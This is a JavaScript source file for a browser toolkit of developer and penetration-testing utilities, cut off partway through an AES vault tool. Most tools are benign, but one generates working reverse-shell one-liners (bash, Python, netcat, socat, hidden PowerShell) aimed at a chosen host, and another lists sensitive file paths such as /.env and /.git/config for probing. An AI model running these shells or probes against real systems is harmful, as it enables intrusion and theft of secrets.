/* D@%@$oul Studio v4 — 17 tools, recents, char-diff, RS256 verify, AES vault, PWA */
(function(){
"use strict";

// ---------- encoding ----------
const enc = s => new TextEncoder().encode(s);
const dec = b => new TextDecoder().decode(b);
function b64enc(s){ let b=enc(s), x=''; for(const v of b) x+=String.fromCharCode(v); return btoa(x); }
function b64dec(s){ const x=atob(s.replace(/\s+/g,'')); const b=new Uint8Array(x.length); for(let i=0;i<x.length;i++) b[i]=x.charCodeAt(i); return dec(b); }
function b64uenc(s){ return b64enc(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
function b64udec(s){ s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4)s+='='; return b64dec(s); }
function b64ubuf(buf){ let x=''; const b=new Uint8Array(buf); for(let i=0;i<b.length;i++) x+=String.fromCharCode(b[i]); return btoa(x).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
function hexenc(s){ return [...enc(s)].map(v=>v.toString(16).padStart(2,'0')).join(''); }
function hexdec(h){ h=h.replace(/[^0-9a-fA-F]/g,''); if(h.length%2)h='0'+h; const b=new Uint8Array(h.length/2); for(let i=0;i<b.length;i++) b[i]=parseInt(h.substr(i*2,2),16); return dec(b); }
function hexdump(bytes){
  let out='';
  for(let i=0;i<bytes.length;i+=16){
    const row=bytes.slice(i,i+16);
    const hx=[...row].map(v=>v.toString(16).padStart(2,'0')).join(' ').padEnd(47);
    const asc=[...row].map(v=>v>=32&&v<127?String.fromCharCode(v):'.').join('');
    out+=i.toString(16).padStart(8,'0')+'  '+hx+'  '+asc+'\n';
  }
  return out;
}
function pemToBuf(pem){
  const b64 = pem.replace(/-----BEGIN [^-]+-----/,'').replace(/-----END [^-]+-----/,'').replace(/\s+/g,'');
  const bin = atob(b64); const b=new Uint8Array(bin.length);
  for(let i=0;i<bin.length;i++) b[i]=bin.charCodeAt(i);
  return b.buffer;
}

// ---------- MD5 ----------
function md5(str){
  const bytes=enc(str), len=bytes.length, bitLen=len*8;
  const padLen=((56-(len+1)%64)+64)%64;
  const buf=new Uint8Array(len+1+padLen+8);
  buf.set(bytes); buf[len]=0x80;
  const dv=new DataView(buf.buffer);
  dv.setUint32(buf.length-8,bitLen>>>0,true);
  dv.setUint32(buf.length-4,Math.floor(bitLen/0x100000000),true);
  let a0=0x67452301,b0=0xefcdab89,c0=0x98badcfe,d0=0x10325476;
  const S=[7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K=new Uint32Array(64); for(let i=0;i<64;i++) K[i]=(Math.abs(Math.sin(i+1))*0x100000000)|0;
  for(let off=0;off<buf.length;off+=64){
    const M=new Uint32Array(16);
    for(let i=0;i<16;i++) M[i]=dv.getUint32(off+i*4,true);
    let A=a0,B=b0,C=c0,D=d0;
    for(let i=0;i<64;i++){
      let F,g;
      if(i<16){F=(B&C)|((~B)&D);g=i;}
      else if(i<32){F=(D&B)|((~D)&C);g=(5*i+1)%16;}
      else if(i<48){F=B^C^D;g=(3*i+5)%16;}
      else{F=C^(B|(~D));g=(7*i)%16;}
      F=(F+A+K[i]+M[g])|0;
      A=D;D=C;C=B;
      B=(B+((F<<S[i])|(F>>>(32-S[i]))))|0;
    }
    a0=(a0+A)|0;b0=(b0+B)|0;c0=(c0+C)|0;d0=(d0+D)|0;
  }
  const out=new Uint8Array(16), odv=new DataView(out.buffer);
  odv.setUint32(0,a0,true);odv.setUint32(4,b0,true);odv.setUint32(8,c0,true);odv.setUint32(12,d0,true);
  return [...out].map(v=>v.toString(16).padStart(2,'0')).join('');
}

// ---------- recents (per-tool I/O snapshot) ----------
const RECENT_KEY = id => 'ds_recent_'+id;
function saveRecent(id, obj){ try{ localStorage.setItem(RECENT_KEY(id), JSON.stringify(obj)); }catch(e){} }
function loadRecent(id){ try{ return JSON.parse(localStorage.getItem(RECENT_KEY(id))||'null'); }catch(e){ return null; } }

// ---------- tool registry ----------
const TOOLS=[];
function tool(def){ TOOLS.push(def); }
function bindRecent(root, id, fields){
  // fields: {el, key}
  const r = loadRecent(id);
  if (r) fields.forEach(f => { if (r[f.key] != null && f.el) f.el.value = r[f.key]; });
  function snap(){ const o={}; fields.forEach(f=>o[f.key]=f.el?f.el.value:''); saveRecent(id, o); }
  root.addEventListener('input', snap);
  return snap;
}

// =========================================================
// 1. HTML → data URL / bookmarklet
// =========================================================
tool({
  id:'payload', name:'HTML → URL / Bookmark', tags:['data url','bookmarklet','html','studio','d-oul'],
  render(root){
    root.innerHTML = `
      <h2>HTML → data URL / Bookmarklet</h2>
      <label>Bookmark name</label><input id="nm" value="D@%@$oul">
      <label>HTML</label><textarea id="ht"></textarea>
      <div class="meter"><div id="mb"></div></div>
      <div id="info" class="note">0 chars</div>
      <div class="row">
        <button id="cv">Convert → data URL</button>
        <button id="cu" class="gold">Copy URL</button>
        <button id="ts" class="green">Test (preview)</button>
        <button id="mk" class="purple">⭐ Make Bookmarklet</button>
        <button id="cp" class="purple">Copy Bookmarklet</button>
        <button id="dl" class="grey">Download .html</button>
      </div>
      <label><input type="checkbox" id="nt" checked> bookmarklet opens in new tab</label>
      <textarea id="out" readonly></textarea>
      <div id="msg" class="note"></div><div id="drag"></div>`;
    const $=s=>root.querySelector(s), ht=$('#ht'), out=$('#out'), msg=$('#msg'), info=$('#info'), mb=$('#mb'), drag=$('#drag');
    const BM_LIMIT=60000, DATA_LIMIT=2000000;
    bindRecent(root, 'payload', [{el:$('#nm'),key:'nm'},{el:ht,key:'ht'}]);
    function upd(){
      const b64len=Math.ceil(enc(ht.value).length*4/3);
      const pct=Math.min(100,b64len/BM_LIMIT*100);
      mb.style.width=pct+'%'; mb.style.background=pct>90?'#f85149':(pct>70?'#f0c850':'#4ec9b0');
      info.textContent=ht.value.length+' chars · b64 '+b64len+' b · budget '+BM_LIMIT+' b ('+Math.round(pct)+'%)';
      info.className=b64len>BM_LIMIT?'err':(pct>70?'warn':'note');
    }
    ht.addEventListener('input', upd); upd();
    function setMsg(t,c){ msg.textContent=t; msg.className=c||'note'; }
    function bmNewTab(b64){ return "javascript:(function(){var b=atob('"+b64+"');var a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);var s=new TextDecoder().decode(a);var u=URL.createObjectURL(new Blob([s],{type:'text/html;charset=utf-8'}));window.open(u,'_blank')})()"; }
    function bmSameTab(b64){ return "javascript:(function(){var b=atob('"+b64+"');var a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);var s=new TextDecoder().decode(a);document.documentElement.innerHTML=s})()"; }
    function makeBm(){ if(!ht.value.trim()){ setMsg('paste HTML first','err'); return null; }
      const b64=b64enc(ht.value); const bm=$('#nt').checked?bmNewTab(b64):bmSameTab(b64);
      if(bm.length>BM_LIMIT){ setMsg('bookmarklet '+bm.length+' b exceeds ~60KB','err'); return null; } return bm; }
    $('#cv').onclick = ()=>{ out.value='data:text/html;charset=utf-8;base64,'+b64enc(ht.value); setMsg(out.value.length>DATA_LIMIT?'data URL > 2MB':'data URL ready', out.value.length>DATA_LIMIT?'err':'note'); };
    $('#cu').onclick = ()=>{ if(!out.value) out.value='data:text/html;charset=utf-8;base64,'+b64enc(ht.value); out.select(); navigator.clipboard?.writeText(out.value).then(()=>setMsg('copied'),()=>setMsg('clipboard blocked','warn')); };
    $('#ts').onclick = ()=>{ if(!out.value) out.value='data:text/html;charset=utf-8;base64,'+b64enc(ht.value);
      const f=document.createElement('iframe'); f.setAttribute('sandbox','allow-scripts');
      f.style.cssText='position:fixed;bottom:16px;right:16px;width:420px;height:320px;border:1px solid #007acc;border-radius:8px;z-index:2147483647;background:#fff';
      f.src=out.value; document.body.appendChild(f); setMsg('preview opened (sandboxed)'); };
    $('#mk').onclick = ()=>{ const bm=makeBm(); if(!bm) return; drag.innerHTML='';
      const a=document.createElement('a'); a.href=bm; a.textContent=$('#nm').value||'D@%@$oul';
      a.style.cssText='display:block;background:#4ec9b0;color:#111;padding:10px;border-radius:6px;text-align:center;font-weight:bold;cursor:grab;text-decoration:none;margin:8px 0';
      drag.appendChild(a); setMsg('drag the green link to the bookmarks bar'); };
    $('#cp').onclick = ()=>{ const bm=makeBm(); if(!bm) return;
      const ta=document.createElement('textarea'); ta.value=bm; ta.style.cssText='position:fixed;left:-9999px';
      document.body.appendChild(ta); ta.select();
      try{ document.execCommand('copy'); setMsg('bookmarklet copied'); }catch(e){ setMsg('copy blocked','warn'); } ta.remove(); };
    $('#dl').onclick = ()=>{ const bl=new Blob([ht.value],{type:'text/html;charset=utf-8'});
      const a=document.createElement('a'); a.href=URL.createObjectURL(bl); a.download=($('#nm').value||'page')+'.html'; a.click();
      setTimeout(()=>URL.revokeObjectURL(a.href),2000); };
  }
});

// =========================================================
// 2. Encoders
// =========================================================
tool({
  id:'encode', name:'Encoders', tags:['base64','hex','url','encode','decode','rot13'],
  render(root){
    root.innerHTML = `
      <h2>Encoders</h2>
      <label>Input</label><textarea id="i"></textarea>
      <div class="row">
        <button data-m="b64">Base64</button><button data-m="b64u">Base64URL</button>
        <button data-m="hex">Hex</button><button data-m="url">URL</button>
        <button data-m="html">HTML entity</button><button data-m="rot13">ROT13</button>
        <button data-m="bin">Binary</button>
        <button class="grey" id="swap">encode ↔ decode</button>
      </div>
      <label>Output</label><textarea id="o" readonly></textarea>
      <div class="row"><button class="gold" id="cp">copy</button></div>
      <div id="msg" class="note"></div>`;
    const $=s=>root.querySelector(s), i=$('#i'), o=$('#o'), msg=$('#msg');
    let mode='enc';
    bindRecent(root,'encode',[{el:i,key:'i'}]);
    const E={ b64:s=>b64enc(s), b64u:s=>b64uenc(s), hex:s=>hexenc(s), url:s=>encodeURIComponent(s),
      html:s=>s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])),
      rot13:s=>s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26)),
      bin:s=>[...enc(s)].map(v=>v.toString(2).padStart(8,'0')).join(' ') };
    const D={ b64:s=>b64dec(s), b64u:s=>b64udec(s), hex:s=>hexdec(s), url:s=>decodeURIComponent(s),
      html:s=>s.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&#39;/g,"'"),
      rot13:s=>E.rot13(s),
      bin:s=>dec(new Uint8Array(s.trim().split(/\s+/).map(b=>parseInt(b,2)))) };
    root.querySelectorAll('[data-m]').forEach(b=>b.onclick=()=>{ try{ o.value=(mode==='enc'?E:D)[b.dataset.m](i.value); msg.textContent=''; }catch(e){ o.value='error: '+e.message; } });
    $('#swap').onclick=()=>{ mode=mode==='enc'?'dec':'enc'; msg.textContent=mode==='enc'?'encode mode':'decode mode'; };
    $('#cp').onclick=()=>{ o.select(); navigator.clipboard?.writeText(o.value).then(()=>msg.textContent='copied',()=>msg.textContent='clipboard blocked'); };
  }
});

// =========================================================
// 3. Hash
// =========================================================
tool({
  id:'hash', name:'Hash', tags:['hash','sha','md5','hmac'],
  render(root){
    root.innerHTML = `
      <h2>Hash</h2>
      <label>Input</label><textarea id="i"></textarea>
      <label>HMAC key (optional)</label><input id="k">
      <div class="row"><button data-a="MD5">MD5</button><button data-a="SHA-1">SHA-1</button><button data-a="SHA-256">SHA-256</button><button data-a="SHA-512">SHA-512</button></div>
      <label>Output</label><pre id="o" class="out"></pre>
      <div class="row"><button class="gold" id="cp">copy</button></div>`;
    const $=s=>root.querySelector(s), i=$('#i'), o=$('#o'), k=$('#k');
    bindRecent(root,'hash',[{el:i,key:'i'},{el:k,key:'k'}]);
    async function go(alg){
      try {
        if (alg==='MD5' && !k.value){ o.textContent=md5(i.value); return; }
        const useHmac=k.value.length>0;
        if (useHmac){
          const key=await crypto.subtle.importKey('raw',enc(k.value),{name:'HMAC',hash:alg},false,['sign']);
          const sig=await crypto.subtle.sign('HMAC',key,enc(i.value));
          o.textContent=[...new Uint8Array(sig)].map(v=>v.toString(16).padStart(2,'0')).join('');
        } else {
          const buf=await crypto.subtle.digest(alg,enc(i.value));
          o.textContent=[...new Uint8Array(buf)].map(v=>v.toString(16).padStart(2,'0')).join('');
        }
      } catch(e){ o.textContent='error: '+e.message; }
    }
    root.querySelectorAll('[data-a]').forEach(b=>b.onclick=()=>go(b.dataset.a));
    $('#cp').onclick=()=>navigator.clipboard?.writeText(o.textContent);
  }
});

// =========================================================
// 4. JSON
// =========================================================
tool({
  id:'json', name:'JSON', tags:['json','format','minify','validate'],
  render(root){
    root.innerHTML = `
      <h2>JSON</h2>
      <textarea id="i"></textarea>
      <div class="row"><button id="p">pretty</button><button id="m" class="green">minify</button><button id="v" class="gold">validate</button></div>
      <textarea id="o" readonly></textarea>`;
    const $=s=>root.querySelector(s), i=$('#i'), o=$('#o');
    bindRecent(root,'json',[{el:i,key:'i'}]);
    $('#p').onclick=()=>{ try{ o.value=JSON.stringify(JSON.parse(i.value),null,2); }catch(e){ o.value='error: '+e.message; } };
    $('#m').onclick=()=>{ try{ o.value=JSON.stringify(JSON.parse(i.value)); }catch(e){ o.value='error: '+e.message; } };
    $('#v').onclick=()=>{ try{ JSON.parse(i.value); o.value='valid'; }catch(e){ o.value='invalid: '+e.message; } };
  }
});

// =========================================================
// 5. Regex tester
// =========================================================
tool({
  id:'regex', name:'Regex', tags:['regex','pattern','test'],
  render(root){
    root.innerHTML = `
      <h2>Regex Tester</h2>
      <label>Pattern</label><input id="p" placeholder="\\b\\w+@\\w+\\.\\w+">
      <label>Flags</label><input id="f" value="g">
      <label>Test string</label><textarea id="s"></textarea>
      <pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s), p=$('#p'), f=$('#f'), s=$('#s'), o=$('#o');
    bindRecent(root,'regex',[{el:p,key:'p'},{el:f,key:'f'},{el:s,key:'s'}]);
    function upd(){
      try{
        const re=new RegExp(p.value,f.value);
        const rows=[]; let m,n=0;
        while((m=re.exec(s.value))&&n++<200){
          rows.push('['+m.index+'] '+JSON.stringify(m[0])+(m.length>1?' groups='+JSON.stringify(m.slice(1)):''));
          if(!re.global) break;
        }
        o.textContent=rows.join('\n')||'no matches';
      } catch(e){ o.textContent='error: '+e.message; }
    }
    p.oninput=upd; f.oninput=upd; s.oninput=upd;
  }
});

// =========================================================
// 6. Diff (line + char)
// =========================================================
tool({
  id:'diff', name:'Diff', tags:['diff','compare','text','char','line'],
  render(root){
    root.innerHTML = `
      <h2>Diff</h2>
      <div class="split">
        <div><label>Left</label><textarea id="a"></textarea></div>
        <div><label>Right</label><textarea id="b"></textarea></div>
      </div>
      <div class="row"><button id="ln">line diff</button><button id="ch" class="green">char diff</button></div>
      <pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s), a=$('#a'), b=$('#b'), o=$('#o');
    bindRecent(root,'diff',[{el:a,key:'a'},{el:b,key:'b'}]);
    function lineDiff(){
      const A=a.value.split('\n'), B=b.value.split('\n');
      const out=[]; let i=0,j=0;
      while(i<A.length||j<B.length){
        if(A[i]===B[j]){ out.push('<span class="diff-same">  '+esc(A[i])+'</span>'); i++; j++; }
        else if(A[i+1]===B[j]){ out.push('<span class="diff-del">- '+esc(A[i])+'</span>'); i++; }
        else if(A[i]===B[j+1]){ out.push('<span class="diff-add">+ '+esc(B[j])+'</span>'); j++; }
        else { if(i<A.length) out.push('<span class="diff-del">- '+esc(A[i++])+'</span>'); if(j<B.length) out.push('<span class="diff-add">+ '+esc(B[j++])+'</span>'); }
      }
      o.innerHTML=out.join('\n');
    }
    function charDiff(){
      // LCS-lite: mark common prefix + common suffix, classify middle
      const A=a.value, B=b.value;
      let p=0; while(p<A.length && p<B.length && A[p]===B[p]) p++;
      let sa=A.length, sb=B.length;
      while(sa>p && sb>p && A[sa-1]===B[sb-1]){ sa--; sb--; }
      const pre=esc(A.slice(0,p)), post=esc(A.slice(sa));
      const del=esc(A.slice(p,sa)), add=esc(B.slice(p,sb));
      o.innerHTML =
        '<span class="diff-same">'+pre+'</span>'+
        (del?'<span class="diff-del">[-'+del+'-]</span>':'')+
        (add?'<span class="diff-add">[+'+add+'+]</span>':'')+
        '<span class="diff-same">'+post+'</span>';
    }
    function esc(s){ return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
    $('#ln').onclick=lineDiff; $('#ch').onclick=charDiff;
  }
});

// =========================================================
// 7. JWT (HS256 + RS256 verify)
// =========================================================
tool({
  id:'jwt', name:'JWT', tags:['jwt','token','auth','hs256','rs256'],
  render(root){
    root.innerHTML = `
      <h2>JWT</h2>
      <label>JWT</label><textarea id="t"></textarea>
      <label>HS256 secret (for verify/sign)</label><input id="k">
      <label>RS256 public key PEM (for verify)</label><textarea id="pem" placeholder="-----BEGIN PUBLIC KEY-----"></textarea>
      <div class="row">
        <button id="dec">decode</button>
        <button class="green" id="verHS">verify HS256</button>
        <button class="green" id="verRS">verify RS256</button>
        <button class="purple" id="sg">sign HS256</button>
      </div>
      <pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s), t=$('#t'), k=$('#k'), pem=$('#pem'), o=$('#o');
    bindRecent(root,'jwt',[{el:t,key:'t'},{el:k,key:'k'}]);
    async function hmac(msg, secret){
      const key=await crypto.subtle.importKey('raw',enc(secret),{name:'HMAC',hash:'SHA-256'},false,['sign']);
      const sig=await crypto.subtle.sign('HMAC',key,enc(msg));
      return b64ubuf(sig);
    }
    $('#dec').onclick=()=>{ try{
      const [h,p]=t.value.trim().split('.');
      o.textContent='header:\n'+JSON.stringify(JSON.parse(b64udec(h)),null,2)+'\n\npayload:\n'+JSON.stringify(JSON.parse(b64udec(p)),null,2);
    }catch(e){ o.textContent='error: '+e.message; } };
    $('#verHS').onclick=async()=>{ try{
      const [h,p,s]=t.value.trim().split('.');
      const ex=await hmac(h+'.'+p,k.value);
      o.textContent=ex===s?'signature VALID':'signature INVALID\nexpected: '+ex;
    }catch(e){ o.textContent='error: '+e.message; } };
    $('#verRS').onclick=async()=>{ try{
      const [h,p,s]=t.value.trim().split('.');
      const key=await crypto.subtle.importKey('spki', pemToBuf(pem.value), {name:'RSASSA-PKCS1-v1_5',hash:'SHA-256'}, false, ['verify']);
      const sigBuf=new Uint8Array(atob(s.replace(/-/g,'+').replace(/_/g,'/')+'=='.slice(0,(4-s.length%4)%4))).map(c=>c.charCodeAt(0));
      const ok=await crypto.subtle.verify('RSASSA-PKCS1-v1_5', key, sigBuf, enc(h+'.'+p));
      o.textContent=ok?'signature VALID':'signature INVALID';
    }catch(e){ o.textContent='error: '+e.message; } };
    $('#sg').onclick=async()=>{ try{
      const [h,p]=t.value.trim().split('.');
      const s=await hmac(h+'.'+p,k.value);
      o.textContent=h+'.'+p+'.'+s;
    }catch(e){ o.textContent='error: '+e.message; } };
  }
});

// =========================================================
// 8. URL / Query
// =========================================================
tool({
  id:'url', name:'URL', tags:['url','query','parse','encode'],
  render(root){
    root.innerHTML = `
      <h2>URL / Query</h2>
      <label>URL</label><input id="u">
      <pre id="o" class="out"></pre>
      <label>Query string → object</label><textarea id="q"></textarea>
      <pre id="o2" class="out"></pre>`;
    const $=s=>root.querySelector(s), u=$('#u'), q=$('#q'), o=$('#o'), o2=$('#o2');
    bindRecent(root,'url',[{el:u,key:'u'},{el:q,key:'q'}]);
    u.oninput=()=>{ try{
      const x=new URL(u.value);
      o.textContent=['protocol','host','hostname','port','pathname','search','hash'].map(k=>k+': '+x[k]).join('\n')
        +'\nparams:\n'+[...x.searchParams].map(([k,v])=>'  '+k+' = '+v).join('\n');
    }catch(e){ o.textContent='error: '+e.message; } };
    q.oninput=()=>{ try{
      const sp=new URLSearchParams(q.value);
      o2.textContent=JSON.stringify(Object.fromEntries(sp),null,2);
    }catch(e){ o2.textContent='error: '+e.message; } };
  }
});

// =========================================================
// 9. Escape
// =========================================================
tool({
  id:'escape', name:'Escape', tags:['escape','json','js','c','shell','html','quote'],
  render(root){
    root.innerHTML = `
      <h2>Escape / Quote</h2>
      <label>Input</label><textarea id="i"></textarea>
      <div class="row">
        <button data-m="json">JSON</button><button data-m="js">JS</button>
        <button data-m="c">C</button><button data-m="shell">Shell quote</button>
        <button data-m="html">HTML</button>
      </div>
      <label>Output</label><textarea id="o" readonly></textarea>`;
    const $=s=>root.querySelector(s), i=$('#i'), o=$('#o');
    bindRecent(root,'escape',[{el:i,key:'i'}]);
    const M={
      json:s=>JSON.stringify(s).slice(1,-1),
      js:s=>s.replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\n/g,'\\n'),
      c:s=>s.replace(/\\/g,'\\\\').replace(/"/g,'\\"').replace(/\n/g,'\\n'),
      shell:s=>"'"+s.replace(/'/g,"'\\''")+"'",
      html:s=>s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))
    };
    root.querySelectorAll('[data-m]').forEach(b=>b.onclick=()=>o.value=M[b.dataset.m](i.value));
  }
});

// =========================================================
// 10. Bytes
// =========================================================
tool({
  id:'bytes', name:'Bytes', tags:['hex','bytes','shellcode','c','python','js'],
  render(root){
    root.innerHTML = `
      <h2>Bytes</h2>
      <label>Raw input</label><textarea id="i"></textarea>
      <div class="row">
        <button data-f="c">C \\xNN</button>
        <button data-f="py">Python b'\\xNN'</button>
        <button data-f="js">JS \\xNN</button>
        <button data-f="hex">hex</button>
        <button class="grey" data-f="dump">hexdump</button>
        <button class="grey" data-f="fromhex">hex → text</button>
      </div>
      <textarea id="o" readonly></textarea>`;
    const $=s=>root.querySelector(s), i=$('#i'), o=$('#o');
    bindRecent(root,'bytes',[{el:i,key:'i'}]);
    const bytes=()=>[...enc(i.value)];
    const F={
      c:()=>bytes().map(v=>'\\x'+v.toString(16).padStart(2,'0')).join(''),
      py:()=>"b'"+bytes().map(v=>'\\x'+v.toString(16).padStart(2,'0')).join('')+"'",
      js:()=>bytes().map(v=>'\\x'+v.toString(16).padStart(2,'0')).join(''),
      hex:()=>hexenc(i.value),
      dump:()=>hexdump(enc(i.value)),
      fromhex:()=>{ try{ return hexdec(i.value); }catch(e){ return 'error: '+e.message; } }
    };
    root.querySelectorAll('[data-f]').forEach(b=>b.onclick=()=>o.value=F[b.dataset.f]());
  }
});

// =========================================================
// 11. Timestamp / number
// =========================================================
tool({
  id:'ts', name:'Timestamp', tags:['time','epoch','iso','date','base'],
  render(root){
    root.innerHTML = `
      <h2>Timestamp / Number</h2>
      <label>Timestamp</label>
      <div class="row"><input id="t" placeholder="1700000000 or 2024-01-01T00:00:00Z" style="flex:1"><button id="now" class="green">now</button><button id="go">convert</button></div>
      <pre id="o" class="out"></pre>
      <label>Number base</label>
      <div class="row"><input id="n" style="flex:1"><button data-b="10">dec</button><button data-b="16">hex</button><button data-b="2">bin</button><button data-b="8">oct</button></div>
      <pre id="o2" class="out"></pre>`;
    const $=s=>root.querySelector(s), t=$('#t'), o=$('#o'), n=$('#n'), o2=$('#o2');
    bindRecent(root,'ts',[{el:t,key:'t'},{el:n,key:'n'}]);
    function conv(){ let v=t.value.trim(), d;
      if(/^-?\d+$/.test(v)){ const x=Number(v); d=new Date(Math.abs(x)>1e12?x:x*1000); } else d=new Date(v);
      if(isNaN(d.getTime())) return o.textContent='invalid';
      o.textContent=['ISO     '+d.toISOString(),'UTC     '+d.toUTCString(),'epoch s '+Math.floor(d.getTime()/1000),'epoch ms '+d.getTime(),'local   '+d.toString()].join('\n');
    }
    $('#now').onclick=()=>{ t.value=Math.floor(Date.now()/1000); conv(); };
    $('#go').onclick=conv;
    root.querySelectorAll('[data-b]').forEach(b=>b.onclick=()=>{
      try{ const v=BigInt(n.value.trim()||'0');
        o2.textContent='dec '+v.toString(10)+'\nhex 0x'+v.toString(16)+'\nbin 0b'+v.toString(2)+'\noct 0o'+v.toString(8);
      }catch(e){ o2.textContent='error: '+e.message; }
    });
  }
});

// =========================================================
// 12. Reverse shell generator
// =========================================================
tool({
  id:'revshell', name:'Reverse Shell', tags:['shell','payload','pentest','bash','powershell'],
  render(root){
    root.innerHTML = `
      <h2>Reverse Shell Generator</h2>
      <div class="row">
        <label style="flex:1">LHOST <input id="h" value="10.0.0.1"></label>
        <label style="flex:1">LPORT <input id="p" value="4444"></label>
      </div>
      <pre id="o" class="out"></pre>
      <div class="row"><button class="gold" id="cp">copy</button></div>
      <div class="note">Text generator only. Nothing is executed.</div>`;
    const $=s=>root.querySelector(s), h=$('#h'), p=$('#p'), o=$('#o');
    bindRecent(root,'revshell',[{el:h,key:'h'},{el:p,key:'p'}]);
    function upd(){ const H=h.value,P=p.value;
      o.textContent =
`# bash
bash -i >& /dev/tcp/${H}/${P} 0>&1

# sh -i
sh -i >& /dev/tcp/${H}/${P} 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${H}",${P}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# nc -e
nc ${H} ${P} -e /bin/sh

# socat
socat TCP:${H}:${P} EXEC:/bin/sh

# powershell (Windows)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('${H}',${P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`;
    }
    h.oninput=upd; p.oninput=upd; upd();
    $('#cp').onclick=()=>navigator.clipboard?.writeText(o.textContent);
  }
});

// =========================================================
// 13. Wordlist
// =========================================================
tool({
  id:'wordlist', name:'Wordlist', tags:['wordlist','fuzz','paths','subdomains'],
  render(root){
    root.innerHTML = `
      <h2>Wordlist / Path Generator</h2>
      <label>Domain</label><input id="d" value="example.com">
      <div class="row"><button data-t="subs">subdomains</button><button data-t="paths">sensitive paths</button><button data-t="params">params</button></div>
      <pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s), d=$('#d'), o=$('#o');
    bindRecent(root,'wordlist',[{el:d,key:'d'}]);
    const SUBS=['www','mail','api','dev','staging','admin','test','vpn','ftp','ns1','ns2','blog','shop','app','m','portal','beta','crm','git','jenkins'];
    const PATHS=['/.git/config','/.env','/.env.bak','/config.php.bak','/backup.zip','/admin','/administrator','/phpmyadmin','/server-status','/robots.txt','/.htaccess','/wp-config.php.bak','/debug.log','/web.config'];
    const PARAMS=['?url=','?next=','?redirect=','?return=','?continue=','?dest=','?target=','?file=','?path=','?id='];
    root.querySelectorAll('[data-t]').forEach(b=>b.onclick=()=>{
      const dom=d.value.trim();
      if(b.dataset.t==='subs') o.textContent=SUBS.map(s=>s+'.'+dom).join('\n');
      else if(b.dataset.t==='paths') o.textContent=PATHS.map(p=>'https://'+dom+p).join('\n');
      else o.textContent=PARAMS.map(p=>'https://'+dom+'/'+p).join('\n');
    });
  }
});

// =========================================================
// 14. HTTP template
// =========================================================
tool({
  id:'http', name:'HTTP Template', tags:['http','request','raw'],
  render(root){
    root.innerHTML = `
      <h2>HTTP Request Template</h2>
      <div class="row"><input id="m" value="GET" style="width:80px"><input id="u" placeholder="https://host/path" style="flex:1"><button id="go">build</button></div>
      <div class="row"><label style="flex:1">Host <input id="h" placeholder="host.example"></label></div>
      <pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s);
    bindRecent(root,'http',[{el:$('#m'),key:'m'},{el:$('#u'),key:'u'},{el:$('#h'),key:'h'}]);
    $('#go').onclick=()=>{ const m=$('#m').value.trim(), u=$('#u').value.trim(), h=$('#h').value.trim();
      let path='/', host=h;
      try{ const x=new URL(u); path=x.pathname+x.search; if(!host) host=x.host; }catch(e){}
      $('#o').textContent=`${m} ${path} HTTP/1.1\nHost: ${host||'host'}\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n\n`;
    };
  }
});

// =========================================================
// 15. UUID
// =========================================================
tool({
  id:'uuid', name:'UUID', tags:['uuid','random','guid'],
  render(root){
    root.innerHTML = `<h2>UUID v4</h2><div class="row"><button id="go">generate</button><button class="green" id="ten">10×</button></div><pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s), o=$('#o');
    function gen(){ return crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,c=>{const r=Math.random()*16|0; const v=c==='x'?r:(r&3|8); return v.toString(16);}); }
    $('#go').onclick=()=>o.textContent=gen();
    $('#ten').onclick=()=>o.textContent=Array.from({length:10},gen).join('\n');
  }
});

// =========================================================
// 16. AES-GCM Vault (PBKDF2 600k iters)
// =========================================================
tool({
  id:'vault', name:'Vault', tags:['aes','encrypt','note','vault','pbkdf2','gcm'],
  render(root){
    root.innerHTML = `
      <h2>AES-GCM Vault</h2>
      <label>Password (not stored)</label><input id="pw" type="password">
      <label>Plaintext / ciphertext (base64 JSON blob)</label>
      <textarea id="i" placeholder="plaintext or paste a vault blob"></textarea>
      <div class="row">
        <button class="green" id="enc">encrypt → blob</button>
        <button id="dec">decrypt blob</button>
        <button class="gold" id="cp">copy</button>
      </div>
      <pre id="o" class="out"></pre>
      <div class="note">AES-256-GCM · PBKDF2-SHA256 · 600,000 iterations · 16-byte salt · 12-byte IV. Blob format: {"v":1,"salt":b64,"iv":b64,"ct":b64}.</div>`;
